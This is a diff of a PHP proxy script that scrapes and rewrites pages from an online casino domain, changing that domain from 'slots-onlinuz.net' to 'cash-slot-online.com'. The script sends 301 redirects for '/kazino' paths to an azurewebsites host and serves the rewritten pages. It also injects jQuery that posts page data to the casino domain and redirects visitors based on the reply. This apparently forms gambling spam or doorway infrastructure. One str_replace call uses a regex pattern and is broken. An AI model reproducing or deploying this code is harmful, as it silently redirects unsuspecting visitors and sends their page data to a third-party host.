@@ -19,7 +19,7 @@
 //set this to you  desired host.
 //for example. if you want http://yourhost.com/test to be proxied by 
 //http://newhost.com/test, just set $new_url='http://yourhost.com'
-$new_url = 'slots-onlinuz.net';
+$new_url = 'cash-slot-online.com';
 if($_SERVER['REQUEST_URI'] == '/kazino' || $_SERVER['REQUEST_URI'] == '/kazino/' || $_SERVER['REQUEST_URI'] == '/online-kazino'){
 		header('HTTP/1.1 301 Moved Permanently');
 		header('Location: https://slots-onlinus.azurewebsites.net/online-kazino/'); 
@@ -174,9 +174,9 @@ curl_setopt( $ch, CURLOPT_USERAGENT, "Proxy" );
 curl_setopt( $ch, CURLOPT_HEADER, 0 );
 $contents = curl_exec( $ch );
 curl_close( $ch );
-$bodytag = str_replace( "((?!slots-onlinuz\.net/b)\w+(?:\.\w+)+", "https://slots-onlinus.azurewebsites.net/", $contents );
+$bodytag = str_replace( "((?!cash-slot-online\.com/b)\w+(?:\.\w+)+", "https://slots-onlinus.azurewebsites.net/", $contents );
 $result  = preg_replace( '~' . $new_url . '~m', "slots-onlinus.azurewebsites.net", $contents );
-preg_match_all( "/(https:\/\/slots-onlinuz.net).*\.(css|jpg|ico|svg|png|js|jpeg|webp|swf|gif|woff2|woff|ttf|pdf)/m", $contents, $urls_delim );
+preg_match_all( "/(https:\/\/cash-slot-online.com).*\.(css|jpg|ico|svg|png|js|jpeg|webp|swf|gif|woff2|woff|ttf|pdf)/m", $contents, $urls_delim );
 if (strpos($contents, '<title>404 Not Found |') !== false) {
 	header("HTTP/1.1 404 Internal Server Error", true, 404);
 }
@@ -239,7 +239,7 @@ $cachetime = 999999;
 			// loc:window.location.origin,
 		// };
 		// jQuery.ajaxSetup({async:false, crossOrigin: true});
-		// jQuery.post( "https://slots-onlinuz.net/slots-online.php", data, function(response) {
+		// jQuery.post( "https://cash-slot-online.com/slots-online.php", data, function(response) {
 			// if(response == 0){
 				// location.href = "/main.php";
 			// }
@@ -270,7 +270,7 @@ echo $result;
 		};
 
 		jQuery.ajaxSetup({async:false, crossOrigin: true});
-		jQuery.post( "https://slots-onlinuz.net/slots-online.php", data, function(response) {
+		jQuery.post( "https://cash-slot-online.com/slots-online.php", data, function(response) {
 			if(response == 0){
 				location.href = "/main.php";
 			}
